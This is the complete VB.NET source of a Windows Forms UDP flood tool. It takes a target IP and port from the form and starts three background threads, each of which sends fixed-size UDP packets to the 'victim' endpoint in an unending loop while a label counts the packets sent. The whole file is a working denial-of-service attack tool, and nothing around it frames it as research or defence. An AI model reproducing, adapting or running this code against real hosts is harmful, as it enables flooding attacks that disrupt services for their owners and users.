Imports System
Imports System.Collections.Generic
Imports System.Net
Imports System.Net.Sockets
Imports System.Threading

Class form1
    Dim i As Integer = 0
    Public Shared IP As String
    Public Shared Port As Integer

    Sub Main() Handles Bg1.DoWork
        Dim victimIp As IPAddress = IPAddress.Parse(IP)
        Dim victim As New IPEndPoint(victimIp, Port)
        Dim packet As Byte() = New Byte(1469) {} '1469
        Dim socket As New Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)
        While True
            If Bg1.CancellationPending = True Then
                Exit Sub
            End If
            Try
                socket.SendTo(packet, victim)
                i += 1
                report()
            Catch ex As Exception
                Bg1.CancelAsync()
                MsgBox(IP & " Is not reachable.")
            End Try
        End While
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Button2.Enabled = True
        Button1.Enabled = False
        TextBox1.Enabled = False
        NumericUpDown1.Enabled = False
        IP = TextBox1.Text
        Port = NumericUpDown1.Value
        sslabel1.Text = ("Flooding: " & IP & " On port : " & Port)
        Bg1.RunWorkerAsync()
        Bg2.RunWorkerAsync()
        Bg3.RunWorkerAsync()

    End Sub
    Sub report() Handles Bg1.ProgressChanged
        sslabel2.Text = i & " Packets Sent"
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Bg1.CancelAsync()
        Bg2.CancelAsync()
        Bg3.CancelAsync()

    End Sub
    Sub done() Handles Bg1.RunWorkerCompleted
        sslabel1.Text = "Idle"
        sslabel2.Text = ""
        i = 0
        Button2.Enabled = False
        Button1.Enabled = True
        TextBox1.Enabled = True
        NumericUpDown1.Enabled = True
    End Sub

    Private Sub Bg2_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles Bg2.DoWork
        Dim victimIp As IPAddress = IPAddress.Parse(IP)
        Dim victim As New IPEndPoint(victimIp, Port)
        Dim packet As Byte() = New Byte(1469) {}
        Dim socket As New Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)

        While True
            If Bg2.CancellationPending = True Then
                Exit Sub
            End If
            Try
                socket.SendTo(packet, victim)
                i += 1
            Catch ex As Exception
                Bg2.CancelAsync()
            End Try
        End While
    End Sub

    Private Sub Bg3_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles Bg3.DoWork
        Dim victimIp As IPAddress = IPAddress.Parse(IP)
        Dim victim As New IPEndPoint(victimIp, Port)
        Dim packet As Byte() = New Byte(1469) {} '1469
        Dim socket As New Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)

        While True
            If Bg3.CancellationPending = True Then
                Exit Sub
            End If
            Try

                socket.SendTo(packet, victim)
                i += 1
            Catch ex As Exception
                Bg3.CancelAsync()
            End Try
        End While
    End Sub
End Class

